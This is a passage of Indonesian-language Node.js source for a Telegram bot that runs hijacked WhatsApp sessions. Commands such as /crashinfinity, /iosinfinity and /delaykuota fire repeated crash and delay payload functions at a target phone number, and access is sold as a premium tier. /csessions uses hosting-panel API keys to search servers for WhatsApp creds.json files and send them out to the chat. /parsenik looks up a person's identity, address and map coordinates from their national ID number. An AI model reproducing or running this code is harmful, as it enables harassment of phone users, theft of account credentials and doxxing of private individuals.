    addedAt: Date.now(),
  };

  savePremiumData(premiumData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
  });

  await bot.sendMessage(
    chatId,
    `ID: ${userId}\nStatus: Premium Ditambahkan\nExpired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/?delprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1].trim();

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "Anda tidak memiliki akses", {
      parse_mode: "Markdown",
    });
  }

  if (!userId) {
    return bot.sendMessage(
      chatId,
      "Usage: /delprem <id>\nContoh: /delprem 123456",
      { parse_mode: "Markdown" }
    );
  }

  const success = removePremiumUser(userId);

  if (success) {
    await bot.sendMessage(chatId, `User premium dihapus\nID: ${userId}`, {
      parse_mode: "Markdown",
    });
  } else {
    await bot.sendMessage(chatId, `User tidak ditemukan atau`, {
      parse_mode: "Markdown",
    });
  }
});


async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

bot.onText(/^\/add$/, async (msg) => {
  const userId = msg.from.id.toString();
  
  if (!verified) {
    return bot.sendMessage(
      chatId,
      "❌ <b>Bot Belum Diverifikasi!</b>\nGunakan /verif tokenmu untuk mengaktifkan.",
      { parse_mode: "HTML" }
    );
  }
  
  if (!isOwner(userId)) {
    return bot.sendMessage(msg.chat.id, "❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply || !reply.document) {
    return bot.sendMessage(msg.chat.id, "❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return bot.sendMessage(msg.chat.id, "❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await bot.sendMessage(msg.chat.id, "🔄 Memproses session…");

  try {
    const file = await bot.getFile(doc.file_id);
    const link = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
    const { data } = await axios.get(link, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return bot.sendMessage(msg.chat.id, "❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = createSessionDir(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActiveSessions(botNumber);

    await connectToWhatsApp(botNumber, msg.chat.id, bot);

    return bot.sendMessage(
      msg.chat.id,
      `✅ Session *${botNumber}* berhasil ditambahkan & online.`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error add session:", err);
    return bot.sendMessage(msg.chat.id, `❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

bot.onText(/^\/?parsenik (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nik = match[1]?.trim();
  
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak akses premium untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  if (!nik || nik.length !== 16) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nGunakan:\n`parsenik 3510050212040003`",
      { parse_mode: "Markdown" }
    );
  }

  // Kirim pesan loading
  const loadingMsg = await bot.sendMessage(chatId, "⏳ Sedang memproses NIK, mohon tunggu...");

  try {
    // Ambil data dari API
    const res = await axios.get(`https://api.siputzx.my.id/api/tools/nik-checker?nik=${nik}`, {
      timeout: 30000,
    });

    const main = res.data?.data?.data; // ambil isi utama
    const meta = res.data?.data?.metadata; // ambil metadata
    const lokasi = main?.koordinat || {};

    // Cek kalau data kosong
    if (!main?.nama) {
      await bot.deleteMessage(chatId, loadingMsg.message_id);
      return bot.sendMessage(chatId, "⚠️ Data tidak ditemukan atau format API berubah.");
    }

    // Format pesan hasil
    const msgText = `
🧾 *HASIL PARSE NIK*

👤 *Nama:* ${main.nama}
🧠 *Zodiak:* ${main.zodiak}
🪪 *NIK:* \`${nik}\`
🚹 *Jenis Kelamin:* ${main.kelamin}
🎂 *Tanggal Lahir:* ${main.tempat_lahir}
📆 *Usia:* ${main.usia}
📅 *Ultah Berikutnya:* ${main.ultah_mendatang}
🪔 *Pasaran:* ${main.pasaran}

🏙️ *Provinsi:* ${main.provinsi}
🏢 *Kabupaten:* ${main.kabupaten}
🏘️ *Kecamatan:* ${main.kecamatan}
🏠 *Kelurahan:* ${main.kelurahan}
📍 *Alamat:* ${main.alamat}
🗳️ *TPS:* ${main.tps}

🌐 *Koordinat:* [Lihat di Maps](https://www.google.com/maps?q=${lokasi.lat},${lokasi.lon})

🕒 *Kategori Usia:* ${meta?.kategori_usia || "-"}
🏷️ *Wilayah:* ${meta?.jenis_wilayah || "-"}
📌 *Kode Wilayah:* ${meta?.kode_wilayah || "-"}
🧩 *Metode Pencarian:* ${meta?.metode_pencarian || "-"}

⏰ _Diperbarui pada: ${meta?.timestamp || "Tidak diketahui"}_
    `;

    await bot.deleteMessage(chatId, loadingMsg.message_id);
    bot.sendMessage(chatId, msgText, {
      parse_mode: "Markdown",
      disable_web_page_preview: false,
    });
  } catch (err) {
    await bot.deleteMessage(chatId, loadingMsg.message_id);
    bot.sendMessage(chatId, `❌ Gagal mengambil data: ${err.message}`);
  }
});

bot.onText(/^\/?listprem/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ Hanya owner yang bisa melihat list premium.");
  }

  const premiumData = loadPremiumData();
  const userIds = Object.keys(premiumData);

  if (userIds.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada user premium saat ini.");
  }

  let listText = "╭── *LIST USER PREMIUM* ──╮\n";
  let index = 1;

  for (const userId of userIds) {
    const { expiry } = premiumData[userId];
    const expiryDate = new Date(expiry).toLocaleString("id-ID", {
      dateStyle: "full",
      timeStyle: "short",
    });
    listText += `│ ${index++}. ID: ${userId}\n│    Expired: ${expiryDate}\n`;
  }

  listText += "╰─────────────────────────╯";

  await bot.sendMessage(chatId, listText, { parse_mode: "Markdown" });
});

bot.onText(/^\/?setjeda (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ Hanya owner yang bisa set jeda.");
  }

  const durationStr = match[1];
  const durationMs = parseDuration(durationStr);
  if (!durationMs) {
    return bot.sendMessage(chatId, "❌ Format salah! Contoh: `10s`, `5m`, `2h`", { parse_mode: "Markdown" });
  }

  globalCooldown = durationMs;
  saveCooldownData({ userCooldowns, globalCooldown }); 
  bot.sendMessage(chatId, `✅ Jeda diatur ke *${durationStr}*`, { parse_mode: "Markdown" });
});

// ===== /startdeploy [id] =====
bot.onText(/^\/?startdeploy (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const id = match[1];
  const userId = msg.from.id;
  const groupId = msg.chat.id; // ambil id grup tempat command dikirim
  
  if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}

  const deployments = loadDeployments();
  if (!deployments[id]) {
    bot.sendMessage(chatId, "⚠️ Bot tidak ditemukan.");
    return;
  }

  try {
    const proc = exec(`node index${id}.js`);
    deployments[id].status = "running";
    deployments[id].pid = proc.pid;
    saveDeployments(deployments);

    bot.sendMessage(chatId, `🚀 Bot ${id} berhasil dijalankan.`);
    } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal menjalankan bot: ${err.message}`);
    }
});


// ===== /deploybot [token] [id] =====
bot.onText(/^\/?deploybot (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const token = match[1];
  const id = match[2];
  const userId = msg.from.id;
  const groupId = msg.chat.id;
  
if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}

  try {
    const indexFile = path.join(__dirname, `index${id}.js`);
    const configFile = path.join(__dirname, `config${id}.js`);
    const dbDir = path.join(__dirname, `database${id}`);
    const sessDir = path.join(__dirname, `sessions${id}`);

    // Salin index utama
    fs.copyFileSync(path.join(__dirname, "index.js"), indexFile);

    // Modifikasi isi file index
    let indexContent = fs.readFileSync(indexFile, "utf8");
    indexContent = indexContent
      .replace(`const config = require("./config");`, `const config = require("./config${id}");`)
      .replace(`const SESSIONS_DIR = "./sessions";`, `const SESSIONS_DIR = "./sessions${id}";`)
      .replace(`const SESSIONS_FILE = "./sessions/active_sessions.json";`, `const SESSIONS_FILE = "./sessions${id}/active_sessions.json";`)
      .replace(`path.join(__dirname, "database", "premium.json");`, `path.join(__dirname, "database${id}", "premium${id}.json");`)
      .replace(`path.join(__dirname, "database", "cooldown.json");`, `path.join(__dirname, "database${id}", "cooldown${id}.json");`);
    fs.writeFileSync(indexFile, indexContent);

    // Buat config
    const configContent = `module.exports = {
  BOT_TOKEN: "${token}",
  OWNER_ID: "${id}",
};`;
    fs.writeFileSync(configFile, configContent);

    // Buat folder database & session
    if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
    if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });

    // Simpan data deploy
    const deployments = loadDeployments();
    deployments[id] = { token, id, status: "stopped" };
    saveDeployments(deployments);

    bot.sendMessage(chatId, `✅ Bot berhasil di-deploy\nID: ${id}`);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Gagal deploy bot: ${err.message}`);
    }
});

bot.onText(/^\/?listdeploy/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Cek apakah user adalah admin
  if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}

  const deployments = loadDeployments();
  
  if (!Object.keys(deployments).length) {
    return bot.sendMessage(chatId, "⚠️ Belum ada bot yang di-deploy.");
  }

  let text = "╭── *LIST DEPLOY* ──╮\n";
  Object.keys(deployments).forEach((id, i) => {
    text += `│ ${i + 1}. ID: ${id} | Status: ${deployments[id].status}\n`;
  });
  text += "╰───────────────────╯";

  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

// ====== /stopalldeploy ======
bot.onText(/^\/?stopalldeploy$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}

  const deployments = loadDeployments();
  const keys = Object.keys(deployments);

  if (!keys.length) return bot.sendMessage(chatId, "⚠️ Tidak ada bot yang aktif.");

  let stopped = 0;
  keys.forEach((id) => {
    try {
      if (deployments[id].status === "running") {
        process.kill(deployments[id].pid);
        deployments[id].status = "stopped";
        stopped++;
      }
    } catch (err) {
      console.error(`Gagal stop bot ${id}: ${err.message}`);
    }
  });

  saveDeployments(deployments);
  bot.sendMessage(chatId, `🛑 Berhasil menghentikan ${stopped} bot yang sedang berjalan.`);
});


// ====== /delalldeploy ======
bot.onText(/^\/?delalldeploy$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}

  const deployments = loadDeployments();
  const keys = Object.keys(deployments);

  if (!keys.length) return bot.sendMessage(chatId, "⚠️ Tidak ada bot yang bisa dihapus.");

  let deleted = 0;
  keys.forEach((id) => {
    try {
      fs.rmSync(path.join(__dirname, `index${id}.js`), { force: true });
      fs.rmSync(path.join(__dirname, `config${id}.js`), { force: true });
      fs.rmSync(path.join(__dirname, `database${id}`), { recursive: true, force: true });
      fs.rmSync(path.join(__dirname, `sessions${id}`), { recursive: true, force: true });

      delete deployments[id];
      deleted++;
    } catch (err) {
      console.error(`Gagal hapus bot ${id}: ${err.message}`);
    }
  });

  saveDeployments(deployments);
  bot.sendMessage(chatId, `🗑️ Berhasil menghapus ${deleted} bot dari sistem.`);
});

bot.onText(/^\/?iosinfinity (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");
    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/iosinfinity 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;
    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>INFINITY API TECH — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    for (const [id, sock] of sessions.entries()) {
      for (let i = 0; i < 5; i++) {
        await gsPayment(sock, target, pc = true);
        await iosLx(sock, target);
        await TrashLocaIos(sock, target);
        await TrashLocaIos2(sock, target, Ptcp = true);
        await gsLocXtendiOS(sock, target, pc = true);
      }
    }

    const captionDone = `
<blockquote>INFINITY API TECH — SELESAI</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
  try {
    await bot.editMessageCaption("<b>Error saat memproses.</b>", {
      chat_id: chatId,
      message_id: msg.message_id,
      parse_mode: "HTML"
    });
  } catch {}

  const report = `
<b>ERROR REPORT — COMMAND ERROR IOS INFINITY</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err?.message}</code>
  `;

  // KIRIM KE SEMUA ADMIN
  for (const admin of ADMIN_ID) {
    try {
      await adminBot.sendMessage(admin, report, { parse_mode: "HTML" });
    } catch (e) {
      console.log("Gagal kirim ke admin:", admin, e.message);
    }
  }
}
});

bot.onText(/^\/?delayv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");
    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/spamkuota 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;
    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>INFINITY API TECH — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    for (const [id, sock] of sessions.entries()) {
      for (let i = 0; i < 5; i++) {
        await InvisHard(sock, target, true);
        await CarouselOtax(sock, target);
    await vom2GlxGs(sock, target, pc = true);
        await gsGlx2StcPck(sock, target, pc = true);
        await InVisibleF(sock, target);
        await flowres(sock, target);
        await flowresInvisible(sock, target);
      }
    }

    const captionDone = `
<blockquote>INFINITY API TECH — SELESAI DELAYV2</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
  try {
    await bot.editMessageCaption("<b>Error saat memproses.</b>", {
      chat_id: chatId,
      message_id: msg.message_id,
      parse_mode: "HTML"
    });
  } catch {}

  const report = `
<b>ERROR REPORT — COMMAND ERROR</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err?.message}</code>
  `;

  // KIRIM KE SEMUA ADMIN
  for (const admin of ADMIN_ID) {
    try {
      await adminBot.sendMessage(admin, report, { parse_mode: "HTML" });
    } catch (e) {
      console.log("Gagal kirim ke admin:", admin, e.message);
    }
  }
}
});

bot.onText(/^\/?crashinfinity (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");
    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/crashinfinity 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;
    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>INFINITY API TECH — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    for (const [id, sock] of sessions.entries()) {
      for (let i = 0; i < 3; i++) {
       await InteractiveUI(sock, target);
        await blankSticker(sock, target);
        await glxFrcInvisible(sock, target);
        await gsGlx(sock, target, zid = true);
        await glxFrc(sock, target);
        await stcPckx(sock, target);
        await InVisibleF(sock, target);
        await gsGlx2StcPck(sock, target, pc = true);
      }
    }

    const captionDone = `
<blockquote>INFINITY API TECH — SELESAI</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
  try {
    await bot.editMessageCaption("<b>Error saat memproses.</b>", {
      chat_id: chatId,
      message_id: msg.message_id,
      parse_mode: "HTML"
    });
  } catch {}

  const report = `
<b>ERROR REPORT — COMMAND ERROR DELAYV2</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err?.message}</code>
  `;

  // KIRIM KE SEMUA ADMIN
  for (const admin of ADMIN_ID) {
    try {
      await adminBot.sendMessage(admin, report, { parse_mode: "HTML" });
    } catch (e) {
      console.log("Gagal kirim ke admin:", admin, e.message);
    }
  }
}
});

bot.onText(/\/delaykuota(?:@[\w_]+)?\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");

    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/delaykuota 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;

    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>INFINITY API TECH — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    // EXECUTOR
    for (const [id, sock] of sessions.entries()) {
      try {
        for (let i = 0; i < 5; i++) {
          await delayhard2025(sock, target, true);
          await Blzr(sock, target);
        }
      } catch (e) {
        console.log("Error di socket:", id, e);
      }
    }

    const captionDone = `
<blockquote>INFINITY API TECH — SELESAI</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
  try {
    await bot.editMessageCaption("<b>Error saat memproses.</b>", {
      chat_id: chatId,
      message_id: msg.message_id,
      parse_mode: "HTML"
    });
  } catch {}

  const report = `
<b>ERROR REPORT — COMMAND ERROR DELAYKUOTA</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err?.message}</code>
  `;

  // KIRIM KE SEMUA ADMIN
  for (const admin of ADMIN_ID) {
    try {
      await adminBot.sendMessage(admin, report, { parse_mode: "HTML" });
    } catch (e) {
      console.log("Gagal kirim ke admin:", admin, e.message);
    }
  }
}
});

const SCAN_PATHS = [
  "/session/creds.json",
  "/sessions/creds.json",
  "/home/container/session/creds.json",
  "/home/container/creds.json",
  "/container/creds.json",
  "/creds.json",
  "creds.json"
];

bot.onText(/^\/?csessions(?:@[\w_]+)?(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(
      chatId,
      "Format salah.\nGunakan:\n`/csessions domain,plta,pltc`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split(",");
  const domain = parts[0];
  const plta = parts[1];
  const pltc = parts[2];

  if (!domain || !plta || !pltc) {
    return bot.sendMessage(
      chatId,
      "Format salah.\nGunakan:\n`/csessions domain,plta,pltc`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, "Sedang scan semua server untuk mencari creds.json ...");

  function norm(p) {
    return p.replace(/\/+/g, "/");
  }

  function isDir(item) {
    const a = item?.attributes;
    if (!a) return false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function traverse(identifier, dir = "/") {
    try {
      const r = await axios.get(
        `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        }
      );

      const list = r.data?.data;
      if (!Array.isArray(list)) return [];

      let found = [];

      for (let item of list) {
        const name = item.attributes?.name || item.name || "";
        const path = norm((dir === "/" ? "" : dir) + "/" + name);

        if (name.toLowerCase() === "creds.json") found.push(path);

        if (name.toLowerCase() === "sessions" && isDir(item)) {
          try {
            const sr = await axios.get(
              `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: path },
                headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
              }
            );

            const sessionList = sr.data?.data || [];
            for (let f of sessionList) {
              const fn = f.attributes?.name || f.name || "";
              if (fn.toLowerCase() === "creds.json") {
                found.push(norm(path + "/" + fn));
              }
            }
          } catch {}
        }

        if (isDir(item)) {
          try {
            const more = await traverse(identifier, path === "" ? "/" : path);
            found = found.concat(more);
          } catch {}
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  try {
    const sr = await axios.get(
      `${domain.replace(/\/+$/, "")}/api/application/servers`,
      {
        headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
      }
    );

    const servers = sr.data?.data;
    if (!Array.isArray(servers))
      return bot.sendMessage(chatId, "Gagal ambil list server.");

    let total = 0;

    for (let s of servers) {
      const identifier =
        s.attributes?.identifier || s.identifier || s.attributes?.id;
      const name = s.attributes?.name || s.name || identifier || "unknown";

      if (!identifier) continue;

      let paths = await traverse(identifier);

      for (let p of SCAN_PATHS) {
        const np = norm(p);
        if (!paths.includes(np)) paths.push(np);
      }

      for (let filePath of paths) {
  try {
    const d = await axios.get(
      `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/download`,
      {
        params: { file: filePath },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      }
    );

    const url = d.data?.attributes?.url;
    if (!url) continue;

    const fileDl = await axios.get(url, { responseType: "arraybuffer" });
    const buf = Buffer.from(fileDl.data);

    total++;

await bot.sendMessage(
  chatId,
  `Ditemukan creds.json di *${name}*\nPath: \`${filePath}\``,
  { parse_mode: "Markdown" }
);

await bot.sendDocument(
  chatId,
  buf,                                 
  { caption: "creds.json" },         
  {
    filename: "creds.json",        
    contentType: "application/json"  
  }
);


    fs.unlinkSync(tmpPath);

  } catch (err) {
    console.log("SEND ERROR:", err?.response?.data || err?.message);
  }
}
    }

    if (total === 0)
      return bot.sendMessage(chatId, "Scan selesai. Tidak ditemukan creds.json.");

    bot.sendMessage(chatId, `Scan selesai. Total dikirim: ${total}`);
  } catch {
    bot.sendMessage(chatId, "Terjadi error saat scan.");
  }
});

bot.onText(/^\/brat (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const teks = match[1]?.trim();

    if (!teks)
        return bot.sendMessage(chatId, "⚠️ Contoh: /brat teksnya");

    try {
        const waitMsg = await bot.sendMessage(chatId, "⏳ Sedang membuat sticker...");

        // URL API
        const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(teks)}&isAnimated=false&delay=500`;

        // Ambil buffer gambar dari API
        const axios = require("axios");
        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
        const buffer = Buffer.from(response.data);

        // Kirim sebagai sticker
        await bot.sendSticker(chatId, buffer);

        // Hapus pesan loading
        bot.deleteMessage(chatId, waitMsg.message_id);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal membuat sticker brat!");
    }
});

const GH_OWNER = "ZEET5644";
const GH_REPO = "DbDreados";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const apiURL = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(apiURL, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const localPath = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileResp = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(localPath), { recursive: true });
            fs.writeFileSync(localPath, Buffer.from(fileResp.data));

            console.log(`[UPDATE] ${localPath}`);
        }

        if (item.type === "dir") {
            fs.mkdirSync(localPath, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

bot.onText(/^\/getcode(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1]?.trim();

  if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}
  if (!url || !/^https?:\/\//.test(url)) {
    return bot.sendMessage(chatId, "❌ Format salah!\n\nContoh: `/getcode https://example.com`", { parse_mode: "Markdown" });
  }

  const timestamp = Date.now();
  const tempDir = `/tmp/getcode_${timestamp}`;
  fs.mkdirSync(tempDir, { recursive: true });

  try {
    const { data: html } = await axios.get(url);
    const $ = cheerio.load(html);
    const resources = new Set();

    // Simpan HTML utama
    const indexPath = path.join(tempDir, "index.html");
    fs.writeFileSync(indexPath, html);

    // Cari resource eksternal
    $("script[src]").each((_, el) => resources.add($(el).attr("src")));
    $("link[rel='stylesheet']").each((_, el) => resources.add($(el).attr("href")));
    $("img[src]").each((_, el) => resources.add($(el).attr("src")));
    $("iframe[src]").each((_, el) => resources.add($(el).attr("src")));

    // Unduh resource
    for (const resUrl of resources) {
      try {
        const fullUrl = new URL(resUrl, url).href;
        const fileName = fullUrl.split("/").pop().split("?")[0];
        const filePath = path.join(tempDir, fileName);
        const res = await axios.get(fullUrl, { responseType: "arraybuffer" });
        fs.writeFileSync(filePath, res.data);
      } catch (e) {
        console.log(`⚠️ Gagal ambil resource: ${resUrl}`);
      }
    }

    // Buat ZIP
    const zipPath = `${tempDir}.zip`;
    const output = fs.createWriteStream(zipPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    archive.pipe(output);
    archive.directory(tempDir, false);
    await archive.finalize();

    await new Promise((resolve) => output.on("close", resolve));

    // Kirim file ke admin
    await bot.sendDocument(chatId, zipPath, {}, { filename: "website-source.zip" });
    bot.sendMessage(chatId, "✅ Source berhasil diambil dan dikirim.");

    // Bersihkan
    fs.rmSync(tempDir, { recursive: true, force: true });
    fs.unlinkSync(zipPath);

  } catch (err) {
    console.error("❌ Gagal ambil URL:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil source:\n${err.message}`);
  }
});

const AdmZip = require("adm-zip");

bot.onText(/^\/downloadmediafire (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const urlInput = match[1];

    try {
        const { data } = await axios.get(
            `https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(urlInput)}`
        );

        const { title, url } = data.data;

        const filePath = `/tmp/${title}`;
        const response = await axios.get(url, { responseType: "arraybuffer" });
